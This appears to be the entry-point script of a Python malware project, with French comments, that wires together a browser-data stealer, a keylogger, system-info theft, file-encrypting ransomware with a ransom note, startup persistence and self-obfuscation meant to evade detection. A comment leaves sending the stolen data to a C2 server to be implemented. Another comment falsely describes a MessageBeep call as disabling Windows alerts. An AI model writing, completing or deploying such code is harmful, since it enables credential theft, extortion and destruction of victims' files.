import os
import sys
import time
import threading
import ctypes
import json
from stealer.browser_stealer import steal_browser_data
from stealer.keylogger import start_keylogger
from stealer.system_info import get_system_info
from ransomware.encryption import encrypt_files
from ransomware.ransom_note import generate_ransom_note
from utils.persistence import add_to_startup
from utils.obfuscator import obfuscate_code

# Charger la configuration
with open("config.json", "r") as f:
    config = json.load(f)

# Désactiver les notifications Windows (pour éviter les alertes)
ctypes.windll.user32.MessageBeep(0)

def stealer_loop():
    """Boucle de vol de données (toutes les 5 minutes)"""
    while True:
        print("[+] Lancement du stealer...")
        steal_browser_data()
        start_keylogger()
        system_info = get_system_info()
        # Envoyer les données volées vers un serveur C2 (à implémenter)
        time.sleep(config["stealer_interval_seconds"])

def ransomware_trigger():
    """Déclenchement du ransomware après 5 minutes"""
    time.sleep(config["stealer_interval_seconds"])
    print("[+] Déclenchement du ransomware...")
    encrypt_files()
    generate_ransom_note()
    add_to_startup()  # Persistance après redémarrage

def main():
    # Obfuscation du code pour éviter la détection
    obfuscated_code = obfuscate_code(sys.argv[0])

    # Lancer le stealer en arrière-plan
    stealer_thread = threading.Thread(target=stealer_loop, daemon=True)
    stealer_thread.start()

    # Lancer le ransomware après 5 minutes
    ransomware_thread = threading.Thread(target=ransomware_trigger, daemon=True)
    ransomware_thread.start()

    # Garder le script actif
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
